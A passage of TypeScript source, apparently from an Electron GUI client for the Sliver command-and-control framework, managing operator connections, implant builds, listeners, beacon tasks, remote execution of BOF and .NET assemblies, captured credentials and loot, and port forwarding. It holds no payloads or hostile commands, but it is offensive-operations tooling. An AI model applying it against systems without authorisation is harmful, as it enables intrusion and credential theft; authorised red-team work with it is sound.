import { createHash, randomUUID } from "node:crypto";
import { chmod, lstat, realpath, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { basename, dirname, join, posix as posixPath, resolve, win32 as win32Path } from "node:path";
import { createSecureContext } from "node:tls";
import { isDeepStrictEqual } from "node:util";

import {
  BrowserWindow,
  clipboard,
  dialog,
  webContents,
  type MessageEvent,
  type MessagePortMain,
  type WebContents,
} from "electron";
import {
  clientpb,
  commonpb,
  sliverpb,
  parseConfig,
  type SliverClientConfig,
  type SliverEventStreamState,
} from "sliver-script";
import type { Subscription } from "rxjs";
import { normalizePivotTopology } from "./pivot-topology.js";
import { normalizeCrackstations, normalizeExternalBuilders } from "./infrastructure-services.js";
import type { InfrastructureServiceSummary, InfrastructureServicesSnapshot, PivotTopologySnapshot } from "../shared/topology-contracts.js";

import {
  IPC,
  disconnectedSnapshot,
  type BuildSummary,
  type CertificatePairSelection,
  type CompilerTargetSummary,
  type ConnectionStatus,
  type DomainCollection,
  type DomainStatus,
  type ExecuteJobStopPlanInput,
  type GenerateFromProfileInput,
  type GenerateInput,
  type HTTPListenerInput,
  type JobSummary,
  type JobStopExecutionResult,
  type JobStopManagedFirewallImpact,
  type JobStopPlan,
  type ListenerInput,
  type ManagedListenerFirewallOutcome,
  type ManagedListenerFirewallProtocol,
  type ManagedServerReference,
  type OperationResult,
  type OperationResultWithValue,
  type ProfileSummary,
  type RecentEventSummary,
  type SavedConfigSummary,
  type SavedArtifact,
  type SaveProfileInput,
  type SliverSnapshot,
  type StartListenerRequest,
  type StartListenerResult,
  type StageListenerInput,
  type WindowLaunchContext,
  SLIVER_PROTOCOL_BASELINE_COMMIT,
  SLIVER_PROTOCOL_COMPATIBILITY,
} from "../shared/contracts.js";
import {
  DEFAULT_TARGET_CATALOG_PAGE_SIZE,
  MAX_TARGET_CATALOG_PAGE_SIZE,
  MAX_TARGET_CATALOG_QUERY_LENGTH,
  TARGET_CAPABILITY_IDS,
  normalizeTargetCatalogQuery,
  targetMatchesCatalogQuery,
  type DestructiveTargetActionId,
  type PrepareTargetActionInput,
  type TargetActionExecutionResult,
  type TargetActionPlan,
  type TargetCatalogEntry,
  type TargetCatalogPage,
  type TargetCatalogPageRequest,
  type TargetMode,
  type TargetRef,
  type TargetSummary,
} from "../shared/target-contracts.js";
import {
  NETWORK_FORWARDING_IPC_EVENTS,
  type ListNetworkForwardsInput,
  type NetworkAddress,
  type NetworkForwardingSnapshot,
  type NetworkPortForwardSummary,
  type NetworkReversePortForwardSummary,
  type NetworkSocks5ProxySummary,
  type NetworkWindowContext,
  type StartPortForwardInput,
  type StartReversePortForwardInput,
  type StartSocks5ProxyInput,
  type StopReversePortForwardInput,
} from "../shared/network-forwarding-contracts.js";
import type {
  BeaconMutationOperationInput,
  BeaconMutationPlan,
  BeaconTaskDetail,
  BeaconTaskResponse,
  BeaconTaskPage,
  BeaconTaskSummary,
  BeaconTasksInvalidationReason,
  OperationPageRequest,
  OperationRecordId,
  TargetOperationInput,
  TargetOperationId,
  TargetOperationPage,
  TargetOperationRecord,
  TargetOperationState,
} from "../shared/operation-contracts.js";
import {
  SESSION_EDITOR_MAX_BYTES,
  SESSION_WORKBENCH_ARTIFACT_IDS,
  SESSION_WORKBENCH_MAX_ARTIFACT_BYTES,
  sessionOperationSupportsPlatform,
  type PrepareSessionDestructiveActionInput,
  type SessionDestructiveActionOutcome,
  type SessionDestructiveActionPreparation,
  type SessionDestructiveActionPlan,
  type SessionDroppedUploadInput,
  type SessionRegistryWriteValue,
  type SessionTargetPlatform,
  type SessionWorkbenchInput,
  type SessionWorkbenchInvocationResult,
  type SessionWorkbenchOutcomeUnknownOperationId,
} from "../shared/session-contracts.js";
import {
  type ListSessionShellsInput,
  type PrepareSessionShellInput,
  type SessionShellPlan,
  type SessionShellResourceActionInput,
  type SessionShellResourceActionResult,
  type SessionShellResourceList,
  type StreamAttachRequest,
  type StreamCloseReason,
  type TerminalRuntimeAsset,
} from "../shared/stream-contracts.js";
import type {
  AddExecutionOutputToLootInput,
  ClearDotNetExecutionHistoryInput,
  ClearProcessExecutionHistoryInput,
  DotNetFileSelection,
  DotNetExecutionHistorySnapshot,
  DotNetExecutionRecord,
  ExecuteExecutionPlanInput,
  ExecutionActionDraft,
  ExecutionActionPlan,
  ExecutionActionResult,
  ExecutionArtifactRole,
  ExecutionCatalog,
  ExecutionOperationId,
  ExecutionOutputReadResult,
  ExecutionReadResult,
  ExecutionResultRequest,
  PrepareExecutionActionInput,
  ProcessExecutionHistorySnapshot,
  ProcessExecutionRecord,
  ReadExecutionOutputInput,
  RunExecutionReadInput,
  SaveExecutionResultInput,
  SaveExecutionResultResult,
} from "../shared/execution-contracts.js";
import { isExecutionOperationId, isExecutionReadOperationId } from "../shared/execution-contracts.js";
import type { DotNetCatalog } from "../shared/dotnet-contracts.js";
import type {
  AddBofOutputToLootInput,
  BofArgumentFileSelection,
  BofCatalog,
  BofDirectorySelection,
  BofExecutionHistorySnapshot,
  BofExecutionRecord,
  BofExecutionRecordInput,
  BofOutputInput,
  ChooseBofArgumentFileInput,
  ClearBofExecutionHistoryInput,
  RunBofInput,
} from "../shared/bof-contracts.js";
import {
  OPERATOR_DATA_LIMITS,
  type AddCredentialInput,
  type AddLootInput,
  type CopyCredentialSecretInput,
  type CredentialCatalogPage,
  type CredentialClipboardResult,
  type CredentialHashTypeOption,
  type CredentialSecretReveal,
  type CredentialSummary,
  type ListCredentialsInput,
  type ListLootInput,
  type LootCatalogPage,
  type LootDetail,
  type LootDownloadResult,
  type LootSummary,
  type RenameLootInput,
  type RevealCredentialSecretInput,
} from "../shared/operator-data-contracts.js";
import {
  artifactFormatFromProto,
  buildImplantConfig,
  ensureTrailingDot,
  isValidPort,
  normalizeProfileName,
  splitList,
  validateImplantName,
} from "./implant-config.js";
import { sniffLootMediaMimeType } from "./loot-media.js";
import { buildStagePayload } from "./stage-payload.js";
import {
  MAX_SAVED_CONFIG_BYTES,
  readCurrentSavedConfig,
  sanitizeSavedConfigMetadata,
  type SavedConfigRecord,
} from "./saved-config-catalog.js";
import { SavedConfigDirectoryWatcher } from "./saved-config-watcher.js";
import { RecentEventDeduplicator } from "./recent-event-deduplicator.js";
import {
  deferredWireGuardResult,
  OperatorConfigStore,
  readConfigForImport,
} from "./operator-config-store.js";
import { readBoundedRegularFile, writePrivateArtifactFileAtomic } from "./secure-file.js";
import {
  createSliverClientAdapter,
  type SliverClientAdapter,
  type SliverClientFactory,
} from "./sliver-client-adapter.js";
import { NetworkForwardingController } from "./network-forwarding-controller.js";
import {
  BeaconTaskCancellationError,
  BeaconTaskStore,
  type TaskOwnershipResolver,
} from "./beacon-task-store.js";
import {
  isAuthoritativeActiveC2Usable,
  OperationEngine,
  TaskCancellationDispatchError,
  type ResolvedOperationTarget,
} from "./operation-engine.js";
import {
  calculateTargetCapabilities,
  createWindowTargetContext,
  targetCapability,
} from "./target-capabilities.js";
import {
  stableTargetFingerprint,
  TargetStore,
  type RevalidatedTarget,
  type TargetDomainName,
} from "./target-store.js";
import {
  SessionArtifactAccessError,
  SessionArtifactStore,
  type SessionArtifactScope,
} from "./session-artifact-store.js";
import {
  SessionWorkbench,
  SessionWorkbenchPlatformError,
  SessionWorkbenchRemoteError,
  type SessionPreparedStoredArtifactSave,
  type SessionWorkbenchArtifactGateway,
} from "./session-workbench.js";
import {
  SessionFileEditConflictError,
  SessionFileEditPreflightError,
  verifySessionFileEditPrecondition,
} from "./session-file-edit.js";
import {
  StreamManager,
  type MainStreamEndpoint,
  type StartMainStreamEndpoint,
  type StreamAttachmentPort,
  type StreamOwnerBinding,
} from "./stream-manager.js";
import { loadTerminalRuntime } from "./terminal-runtime.js";
import {
  decodeBofOutput,
  decodeBofTask,
  installedBofCommands,
  MAX_BOF_ARGUMENT_FILE_BYTES,
  packBofArguments,
  readBofCommandsFromDirectory,
  readInstalledBofObject,
  type InstalledBofCommand,
} from "./bof-workbench.js";
import { packLegacyBofArguments, readInstalledBofLoader } from "./bof-legacy-dispatch.js";
import { installedDotNetAssemblies, MAX_DOTNET_ASSEMBLY_BYTES, readInstalledDotNetAssembly } from "./dotnet-armory.js";
import {
  ExecutionArtifactStore,
  type ExecutionArtifactScope,
} from "./execution-artifact-store.js";
import {
  assertExecutionOperationSupported,
  executionCapabilitiesForTarget,
  executionOperationDescriptor,
} from "./execution-operation-registry.js";
import {
  clearExecutionDraftSecrets,
  executionArtifactSelections,
  executionReviewFields,
  executionWarning,
  requestedExecutionIdentity,
} from "./execution-review.js";
import {
  dispatchExecutionAction,
  EXECUTION_WORKBENCH_OUTPUT_MAX_BYTES,
  ExecutionRemoteRejectedError,
  ExecutionTargetRejectedError,
  ExecutionWorkbenchInputError,
  runExecutionRead as runExecutionWorkbenchRead,
} from "./execution-workbench.js";
import {
  decodeExecutionBeaconTask,
  ExecutionBeaconTaskDecodeError,
  type DecodedExecutionBeaconTask,
} from "./execution-beacon-task.js";

interface CertificatePair {
  cert: Buffer;
  key: Buffer;
  expiresAt: number;
}

class SessionWorkbenchBoundaryError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "SessionWorkbenchBoundaryError";
  }
}

class SessionReviewedActionTargetRejectedError extends Error {
  constructor() {
    super("The target rejected the reviewed action");
    this.name = "SessionReviewedActionTargetRejectedError";
  }
}

interface WindowContext {
  contentsId: number;
  poolKey?: string;
  configName?: string;
  activeConfig?: ActiveConfigReference;
  snapshot: SliverSnapshot;
  certificatePairs: Map<string, CertificatePair>;
  certificateTimers: Map<string, NodeJS.Timeout>;
  savedConfigs: Map<string, SavedConfigRecord>;
  connectionAttempt: number;
  stopPlans: Map<string, InternalStopPlan>;
  activeTarget?: TargetRef;
  beaconWatch: boolean;
  targetPlans: Map<string, InternalTargetActionPlan>;
  targetPlanAdmissions: Set<string>;
  sessionPlans: Map<string, InternalSessionActionPlan>;
  sessionPlanAdmissions: Set<string>;
  sessionPlanTimers: Map<string, NodeJS.Timeout>;
  sessionWorkbenchAdmissions: Map<string, "standard" | "artifact">;
  sessionShellPrepareAdmissions: Set<string>;
  executionPlans: Map<string, InternalExecutionPlan>;
  executionPlanTimers: Map<string, NodeJS.Timeout>;
  executionAdmissions: Set<string>;
  executionResults: Map<string, InternalExecutionResult>;
  executionResultTimers: Map<string, NodeJS.Timeout>;
  dotNetFile?: { token: string; target: TargetRef; data: Buffer; fileName: string; isDll: boolean; expiresAt: number };
  dotNetFileTimer?: NodeJS.Timeout;
  dotNetFileRevision: number;
  bofArgumentFiles: Map<string, { commandId: string; index: number; target: TargetRef; data: Buffer; fileName: string; expiresAt: number }>;
  bofArgumentFileTimer?: NodeJS.Timeout;
  bofLocalPackage?: { directory: string; namespace: string; manifestDigest: string; target: TargetRef };
  bofDirectorySelectionRevision: number;
  taskListAdmissions: Set<string>;
  taskDetailAdmissions: Set<string>;
  taskCancelAdmissions: Set<string>;
  targetPageCursors: Map<string, InternalTargetPageCursor>;
  manualRefresh?: ManualRefreshState;
  operationEngine?: OperationEngine;
  operationPoolKey?: string;
  operationReconcileTimer?: NodeJS.Timeout;
  operationReconcileInFlight?: Promise<void>;
  operationReconcilePending?: boolean;
  operationReconcileIncludeOutcomeUnknown?: boolean;
  operationReconcilePendingReason?: BeaconTasksInvalidationReason;
}

/** An editor window holds this object only in Electron main, never in a renderer. */
interface RemoteTextEditorBinding {
  readonly owner: WebContents;
  readonly rendererUrl: string;
  readonly rendererProcessId: number;
  readonly rendererFrameToken: string;
  readonly context: WindowContext;
  readonly pool: BackendPool;
  readonly epoch: number;
  readonly connectionAttempt: number;
  readonly target: TargetRef;
  readonly remotePath: string;
  expectedSha256: string;
}

interface ActiveConfigReference {
  readonly path: string;
  readonly digest: string;
  readonly requirePrivateMode: boolean;
}

/** Main-process-only copy of the currently connected profile. Callers own and must zeroize configBytes. */
export interface ActiveConfigMaterial {
  readonly configName: string;
  readonly configBytes: Buffer;
}

interface ManualRefreshState {
  promise: Promise<OperationResult<SliverSnapshot>>;
  waiters: number;
  followupRequested: boolean;
  followupStarted: boolean;
}

const GENERATE_TIMEOUT_SECONDS = 15 * 60;
const MAX_WINDOW_SESSION_SHELL_PREPARES = 2;
const MAX_GLOBAL_SESSION_SHELL_PREPARES = 16;
const EXECUTION_PLAN_TTL_MS = 60_000;
const EXECUTION_RESULT_TTL_MS = 5 * 60_000;
const DOTNET_FILE_TTL_MS = 5 * 60_000;
const MAX_WINDOW_EXECUTION_PLANS = 4;
const MAX_WINDOW_EXECUTION_RESULTS = 128;
const MAX_PROCESS_EXECUTION_HISTORY_ENTRIES = 50;
const MAX_PROCESS_EXECUTION_HISTORY_OUTPUT_BYTES = 32 * 1_024 * 1_024;
const MAX_DOTNET_EXECUTION_HISTORY_ENTRIES = 50;
const MAX_DOTNET_EXECUTION_HISTORY_OUTPUT_BYTES = 32 * 1_024 * 1_024;
const MAX_WINDOW_EXECUTION_REQUESTS = 4;
const MAX_GLOBAL_EXECUTION_REQUESTS = 16;
const MAX_RECENT_EVENTS = 50;
const RECONCILE_INTERVAL_MS = 30_000;
const CERTIFICATE_CAPABILITY_TTL_MS = 5 * 60_000;
const JOB_STOP_PLAN_TTL_MS = 60_000;
const TARGET_ACTION_PLAN_TTL_MS = 60_000;
const MAX_OUTSTANDING_TARGET_ACTION_PLANS = 8;
const SESSION_ACTION_PLAN_TTL_MS = 60_000;
const MAX_OUTSTANDING_SESSION_ACTION_PLANS = 4;
const MAX_WINDOW_SESSION_WORKBENCH_REQUESTS = 8;
const MAX_WINDOW_SESSION_ARTIFACT_REQUESTS = 2;
const MAX_GLOBAL_SESSION_WORKBENCH_REQUESTS = 32;
const MAX_GLOBAL_SESSION_ARTIFACT_REQUESTS = 4;
const SESSION_SAVE_INTENT_TTL_MS = 60 * 60_000;
const MAX_SESSION_SAVE_INTENTS = 1_024;
const MAX_TARGETS_PER_ACTION_PLAN = 100;
const MAX_WINDOW_TASK_LIST_REQUESTS = 4;
const MAX_WINDOW_TASK_DETAIL_REQUESTS = 4;
const MAX_WINDOW_TASK_CANCEL_REQUESTS = 4;
const TARGET_PAGE_CURSOR_TTL_MS = 5 * 60_000;
const MAX_WINDOW_TARGET_PAGE_CURSORS = 8;
const MAX_WINDOW_MANUAL_REFRESH_WAITERS = 4;
const MAX_TARGET_CATALOG_SNAPSHOTS = 32;
const MAX_TARGET_CATALOG_SNAPSHOT_BYTES = 64 * 1024 * 1024;
const MAX_CERTIFICATE_BYTES = 1024 * 1024;
const MAX_KEY_BYTES = 1024 * 1024;
const MAX_DOMAIN_ITEMS = 500;
const MAX_SUMMARY_TEXT = 256;
const MAX_SUMMARY_LIST_ITEMS = 32;
const OPERATION_RECONCILE_INTERVAL_MS = 2_000;
const MAX_POOL_TASK_CLAIMS = 1_000;
const MAX_POOL_RECOVERABLE_TASK_CLAIMS = 400;
const CREDENTIAL_CLIPBOARD_TTL_MS = 30_000;
const POOL_TASK_CLAIM_TTL_MS = 24 * 60 * 60_000;
const SESSION_MUTATION_TARGET_REJECTED_MESSAGE =
  "The target rejected the session mutation. Refresh the session state before taking another action.";
const SESSION_REVIEWED_ACTION_TARGET_REJECTED_MESSAGE = "The target rejected the reviewed action";

const TERMINAL_OPERATION_STATES: ReadonlySet<TargetOperationState> = new Set([
  "completed",
  "failed",
  "canceled",
  "partial",
  "outcome-unknown",
  "target-disappeared",
]);

type PoolTaskSignalReason = BeaconTasksInvalidationReason | "connection-interrupted";

interface PoolTaskClaim {
  ownerWindowId: number;
  requestId: string;
  operationId: OperationRecordId;
  beaconId: string;
  claimedAt: number;
  expectedPingNonce?: number;
  expectedRequest?: TargetOperationInput;
  requiresResultVerification: boolean;
  recoverable: boolean;
}

/** Decoder provenance survives output cache eviction without granting ownership. */
interface PoolExecutionTaskFact {
  target: TargetRef;
  operationId: ExecutionOperationId | "bof.execute";
  processWaited: boolean;
  recordedAt: number;
  ambiguous: boolean;
}

export type { SliverClientAdapter, SliverClientFactory } from "./sliver-client-adapter.js";

export interface ManagedListenerFirewallInput {
  server: ManagedServerReference;
  protocol: ManagedListenerFirewallProtocol;
  port: number;
}

export interface ManagedListenerFirewallController {
  ensureIngress(input: ManagedListenerFirewallInput): Promise<OperationResult<ManagedListenerFirewallOutcome>>;
  removeIngress(input: ManagedListenerFirewallInput): Promise<OperationResult<ManagedListenerFirewallOutcome>>;
}

function unavailableManagedListenerFirewallController(): ManagedListenerFirewallController {
  const unavailable = async (): Promise<OperationResult<ManagedListenerFirewallOutcome>> => ({
    ok: false,
    error: "Managed listener firewall integration is unavailable",
  });
  return { ensureIngress: unavailable, removeIngress: unavailable };
}

export interface ConnectionRegistryOptions {
  savedConfigDirectory?: string;
  /** Main-owned local Armory installation directory. */
  clientRootDirectory?: string;
  /** Directory for the GUI's reference manifest; retained for existing test harnesses. */
  managedConfigDirectory?: string;
  clientFactory?: SliverClientFactory;
  now?: () => number;
  resolveManagedServer?: (configDigest: string) => ManagedServerReference | null;
  managedListenerFirewall?: ManagedListenerFirewallController;
}

interface InternalStopPlan {
  token: string;
  expiresAt: number;
  contentsId: number;
  poolKey: string;
  epoch: number;
  jobs: JobSummary[];
  fingerprints: string[];
  stopsAll: boolean;
  managedFirewall: JobStopManagedFirewallImpact | null;
}

interface InternalTargetActionPlan {
  token: string;
  expiresAt: number;
  contentsId: number;
  poolKey: string;
  epoch: number;
  actionId: DestructiveTargetActionId;
  targets: Array<{ summary: TargetSummary; ref: TargetRef }>;
  totalTargets: number;
}

interface InternalSessionActionPlan {
  token: string;
  expiresAt: number;
  contentsId: number;
  poolKey: string;
  epoch: number;
  connectionAttempt: number;
  target: TargetRef;
  journalTarget: ResolvedOperationTarget;
  input: PrepareSessionDestructiveActionInput;
  payloadDigest: string;
  artifactHandle?: string;
  artifactScope?: SessionArtifactScope;
  artifactSha256?: string;
  resourceFingerprint?: string;
}

interface InternalExecutionArtifact {
  role: ExecutionArtifactRole | "stdout" | "stderr" | "combined";
  scope: ExecutionArtifactScope;
  handle: string;
}

interface InternalExecutionPlan {
  token: string;
  expiresAt: number;
  contentsId: number;
  poolKey: string;
  epoch: number;
  connectionAttempt: number;
  target: TargetRef;
  journalTarget: ResolvedOperationTarget;
  draft: ExecutionActionDraft;
  artifacts: Array<InternalExecutionArtifact & { role: ExecutionArtifactRole }>;
  review: ExecutionActionPlan;
  assemblySourceKind?: "file" | "armory";
}

interface InternalExecutionResult {
  value: ExecutionActionResult;
  /** Captured process execution waits for the subprocess and has a final Status. */
  processWaited?: boolean;
  expiresAt: number;
  output: Partial<Record<"stdout" | "stderr" | "combined", InternalExecutionArtifact>>;
  poolKey: string;
  epoch: number;
  connectionAttempt: number;
  target: TargetRef;
}

interface InternalProcessExecutionHistory {
  readonly key: string;
  readonly poolKey: string;
  readonly epoch: number;
  readonly target: TargetRef;
  revision: number;
  entries: Array<{ order: number; record: ProcessExecutionRecord }>;
}

interface InternalDotNetExecutionHistory {
  readonly key: string;
  readonly poolKey: string;
  readonly epoch: number;
  readonly target: TargetRef;
  revision: number;
  entries: Array<{ order: number; record: DotNetExecutionRecord }>;
}

interface SharedExecutionHistoryResult {
  context: WindowContext;
  pool: BackendPool;
  target: RevalidatedTarget;
  record: ProcessExecutionRecord | DotNetExecutionRecord;
  assertCurrent: () => void;
}

interface InternalBofExecutionHistory {
  readonly poolKey: string;
  readonly epoch: number;
  readonly target: TargetRef;
  revision: number;
  records: BofExecutionRecord[];
}

type RefreshedExecutionBeaconTask =
  | { state: "pending" }
  | { state: "canceled" }
  | { state: "failed" }
  | { state: "outcome-unknown" }
  | { state: "decoded"; decoded: DecodedExecutionBeaconTask };

interface SessionSaveIntent {
  readonly destinationKey: string;
  readonly destinationPath: string;
  readonly token: string;
  readonly reservedAt: number;
}

interface InternalTargetPageCursor {
  contentsId: number;
  poolKey: string;
  backendEpoch: number;
  connectionAttempt: number;
  mode: TargetMode;
  query: string;
  snapshotKey: string;
  total: number;
  offset: number;
  expiresAt: number;
}

interface TargetCatalogSnapshot {
  key: string;
  poolKey: string;
  backendEpoch: number;
  mode: TargetMode;
  query: string;
  sourceRevision: number;
  identities: Array<{ id: string; fingerprint: string }>;
  estimatedBytes: number;
  lastAccessed: number;
}

export class ConnectionRegistry {
  private readonly windows = new Map<number, WindowContext>();
  private readonly pools = new Map<string, BackendPool>();
  private readonly remoteTextEditorBindings = new WeakSet<object>();
  private readonly targetCatalogSnapshots = new Map<string, TargetCatalogSnapshot>();
  private readonly sessionArtifacts: SessionArtifactStore;
  private readonly executionArtifacts: ExecutionArtifactStore;
  private readonly processExecutionHistories = new Map<string, InternalProcessExecutionHistory>();
  private readonly dotNetExecutionHistories = new Map<string, InternalDotNetExecutionHistory>();
  private readonly bofExecutionHistories = new Map<string, InternalBofExecutionHistory>();
  private readonly streams: StreamManager;
  private readonly sessionWorkbenchGlobalAdmissions = new Map<string, "standard" | "artifact">();
  private readonly terminalRuntimeAdmissions = new Set<number>();
  private readonly sessionShellPrepareGlobalAdmissions = new Set<string>();
  private readonly executionGlobalAdmissions = new Set<string>();
  private readonly sessionSaveIntents = new Map<string, SessionSaveIntent>();
  private readonly sessionSaveLocks = new Map<string, Promise<void>>();
  private sessionSaveReservationTail: Promise<void> = Promise.resolve();
  private targetCatalogSnapshotBytes = 0;
  private processExecutionHistoryEntryCount = 0;
  private processExecutionHistoryOutputBytes = 0;
  private nextProcessExecutionHistoryOrder = 0;
  private nextDotNetExecutionHistoryOrder = 0;
  private dotNetExecutionHistoryEntryCount = 0;
  private dotNetExecutionHistoryOutputBytes = 0;
  private credentialClipboard?: {
    digest: string;
    expiresAt: number;
    ownerContentsId: number;
    timer: NodeJS.Timeout;
  };

  private readonly configStore: OperatorConfigStore;
  private readonly savedConfigWatcher: SavedConfigDirectoryWatcher;
  private readonly clientFactory: SliverClientFactory;
  private readonly now: () => number;
  private readonly clientRootDirectory: string;
  private resolveManagedServer: (configDigest: string) => ManagedServerReference | null;
  private managedListenerFirewall: ManagedListenerFirewallController;
  private nextEpoch = 1;

  constructor(options: string | ConnectionRegistryOptions = {}) {
    const normalized = typeof options === "string" ? { savedConfigDirectory: options } : options;
    const clientRootDirectory = resolve(normalized.clientRootDirectory ?? process.env["SLIVER_CLIENT_ROOT_DIR"] ?? join(homedir(), ".sliver-client"));
    this.clientRootDirectory = clientRootDirectory;
    const externalDirectory = normalized.savedConfigDirectory ?? join(clientRootDirectory, "configs");
    const metadataDirectory = normalized.managedConfigDirectory ?? join(clientRootDirectory, "gui");
    this.configStore = new OperatorConfigStore(externalDirectory, metadataDirectory);
    this.savedConfigWatcher = new SavedConfigDirectoryWatcher(
      externalDirectory,
      async () => {
        const records = await this.configStore.list();
        // Catalog IDs are intentionally regenerated on every read. The watcher
        // compares stable metadata so it only invalidates windows on real changes.
        return JSON.stringify(records.map(({ path, digest, summary: { id: _id, ...summary } }) =>
          [path, digest, summary]));
      },
      () => {
        for (const contentsId of this.windows.keys()) {
          const contents = webContents.fromId(contentsId);
          if (!contents || contents.isDestroyed()) continue;
          try {
            contents.send(IPC.savedConfigsChanged);
          } catch {
            // The event is advisory. A new or navigated renderer reads the catalog on load.
          }
        }
      },
    );
    this.clientFactory = normalized.clientFactory ?? createSliverClientAdapter;
    this.now = normalized.now ?? Date.now;
    this.resolveManagedServer = normalized.resolveManagedServer ?? (() => null);
    this.managedListenerFirewall = normalized.managedListenerFirewall ?? unavailableManagedListenerFirewallController();
    this.sessionArtifacts = new SessionArtifactStore({ now: this.now });
    this.executionArtifacts = new ExecutionArtifactStore({ now: this.now });
    this.streams = new StreamManager({ now: this.now });
  }

  /** Read-only local provenance lookup; this never invokes cloud operations. */
  setManagedServerResolver(resolve: (configDigest: string) => ManagedServerReference | null): void {
    this.resolveManagedServer = resolve;
    this.refreshManagedServerMetadata();
  }

  setManagedListenerFirewallController(controller: ManagedListenerFirewallController): void {
    this.managedListenerFirewall = controller;
  }

  refreshManagedServerMetadata(): void {
    const changedPools = new Set<BackendPool>();
    for (const context of this.windows.values()) {
      const pool = context.poolKey ? this.pools.get(context.poolKey) : undefined;
      const managedServer = this.managedServerForConnection(pool, context.snapshot.connection.status);
      const previous = context.snapshot.connection.managedServer;
      // Compare the complete display-only reference so newly added nested
      // metadata participates without another field-by-field change detector.
      if (isDeepStrictEqual(previous, managedServer)) continue;
      context.snapshot = {
        ...context.snapshot,
        connection: { ...context.snapshot.connection, managedServer },
      };
      this.pushSnapshot(context.contentsId, context.snapshot);
      if (pool) changedPools.add(pool);
    }
    for (const pool of changedPools) this.broadcastNetworkForwardingChanged(pool.key, pool.epoch);
  }

  private managedServerForConnection(
    pool: BackendPool | undefined,
    status: ConnectionStatus,
  ): ManagedServerReference | null {
    if (!pool || (status !== "connected" && status !== "degraded" && status !== "reconnecting")) return null;
    try {
      // The pool key is the digest of the verified bytes used for this connection.
      // It is available even for events emitted before connect() has returned.
      return this.resolveManagedServer(pool.key);
    } catch {
      // Unavailable local deployment metadata must not break an operator connection.
      return null;
    }
  }

  registerWindow(contentsId: number): void {
    if (this.windows.size === 0) this.savedConfigWatcher.start();
    this.windows.set(contentsId, {
      contentsId,
      snapshot: disconnectedSnapshot(),
      certificatePairs: new Map(),
      certificateTimers: new Map(),
      savedConfigs: new Map(),
      connectionAttempt: 0,
      stopPlans: new Map(),
      beaconWatch: false,
      targetPlans: new Map(),
      targetPlanAdmissions: new Set(),
      sessionPlans: new Map(),
      sessionPlanAdmissions: new Set(),
      sessionPlanTimers: new Map(),
      sessionWorkbenchAdmissions: new Map(),
      sessionShellPrepareAdmissions: new Set(),
      executionPlans: new Map(),
      executionPlanTimers: new Map(),
      executionAdmissions: new Set(),
      executionResults: new Map(),
      executionResultTimers: new Map(),
      dotNetFileRevision: 0,
      bofArgumentFiles: new Map(),
      bofDirectorySelectionRevision: 0,
      taskListAdmissions: new Set(),
      taskDetailAdmissions: new Set(),
      taskCancelAdmissions: new Set(),
      targetPageCursors: new Map(),
    });
  }

  async unregisterWindow(contentsId: number): Promise<void> {
    const context = this.windows.get(contentsId);
    this.windows.delete(contentsId);
    if (this.windows.size === 0) this.savedConfigWatcher.stop();
    if (context) {
      context.connectionAttempt += 1;
      delete context.manualRefresh;
      closeWindowOperationEngine(context);
      delete context.activeConfig;
      clearCertificateCapabilities(context);
      context.stopPlans.clear();
      delete context.activeTarget;
      context.beaconWatch = false;
      context.targetPlans.clear();
      this.revokeSessionTargetCapabilities(context);
      this.revokeExecutionState(context);
      context.sessionPlanAdmissions.clear();
      context.sessionWorkbenchAdmissions.clear();
      context.sessionShellPrepareAdmissions.clear();
      context.targetPageCursors.clear();
    } else {
      this.sessionArtifacts.removeOwner(contentsId);
      this.executionArtifacts.removeOwner(contentsId);
    }
    context?.savedConfigs.clear();
    await this.streams.closeWindow(contentsId, "window-closed").catch(() => undefined);
    if (context?.poolKey) await this.releasePool(context.poolKey, contentsId).catch(() => undefined);
    if (this.credentialClipboard?.ownerContentsId === contentsId || this.windows.size === 0) {
      this.clearCredentialClipboardIfCurrent();
    }
  }

  async closeWindowStreams(
    contentsId: number,
    reason: Extract<StreamCloseReason, "navigation" | "renderer-gone" | "application-shutdown">,
  ): Promise<void> {
    await this.streams.closeWindow(contentsId, reason);
  }

  inheritConnection(sourceContentsId: number, targetContentsId: number): void {
    const source = this.windows.get(sourceContentsId);
    const target = this.requireWindow(targetContentsId);
    if (!source?.poolKey) return;
    const pool = this.pools.get(source.poolKey);
    if (!pool) return;

    void this.streams.closeWindow(targetContentsId, "backend-rebound");
    target.connectionAttempt += 1;
    delete target.activeTarget;
    this.revokeSessionTargetCapabilities(target);
    this.revokeExecutionState(target);
    target.sessionPlanAdmissions.clear();
    target.poolKey = source.poolKey;
    if (source.configName) target.configName = source.configName;
    else delete target.configName;
    if (source.activeConfig) target.activeConfig = Object.freeze({ ...source.activeConfig });
    else delete target.activeConfig;
    target.snapshot = this.snapshotForWindow(target, pool.snapshot);
    pool.addWindow(targetContentsId);
    this.requireOperationEngine(targetContentsId, target, pool);
    this.pushSnapshot(targetContentsId, target.snapshot);
  }

  async claimSessionShellWindow(
    sourceContentsId: number,
    sourceRendererProcessId: number,
    sourceRendererFrameToken: string,
    destinationContentsId: number,
    destinationRendererProcessId: number,
    destinationRendererFrameToken: string,
    expectedTarget: TargetRef,
    preferredResourceId?: string,
  ): Promise<OperationResult<WindowLaunchContext>> {
    try {
      const source = this.requireWindow(sourceContentsId);
      const destination = this.requireWindow(destinationContentsId);
      if (!source.poolKey || source.poolKey !== destination.poolKey) {
        throw new Error("The managed-shell destination does not share the source backend");
      }
      const pool = this.pools.get(source.poolKey);
      if (!pool || pool.epoch !== expectedTarget.backendEpoch) {
        throw new Error("The managed-shell backend changed before transfer");
      }
      if (
        !source.activeTarget ||
        source.activeTarget.mode !== "session" ||
        !sameTargetRefIdentity(source.activeTarget, expectedTarget)
      ) {
        throw new Error("The source session changed before managed shells could be transferred");
      }
      assertTargetDomainAuthoritative(pool, "session");
      const current = pool.targetStore.revalidateTargetRef(expectedTarget, pool.epoch);
      if (!current || current.target.mode !== "session" || current.target.liveness !== "active") {
        throw new Error("The source session is no longer active");
      }
      const sourceBinding = streamOwnerBinding(
        source,
        pool,
        current.ref,
        sourceRendererProcessId,
        sourceRendererFrameToken,
      );
      const sourceInventory = this.streams.listSessionShells(sourceBinding);
      const destinationBinding = streamOwnerBinding(
        destination,
        pool,
        current.ref,
        destinationRendererProcessId,
        destinationRendererFrameToken,
      );
      const destinationInventory = this.streams.listSessionShells(destinationBinding);
      if (
        preferredResourceId !== undefined &&
        !sourceInventory.resources.some((resource) => resource.resourceId === preferredResourceId) &&
        !destinationInventory.resources.some((resource) => resource.resourceId === preferredResourceId)
      ) {
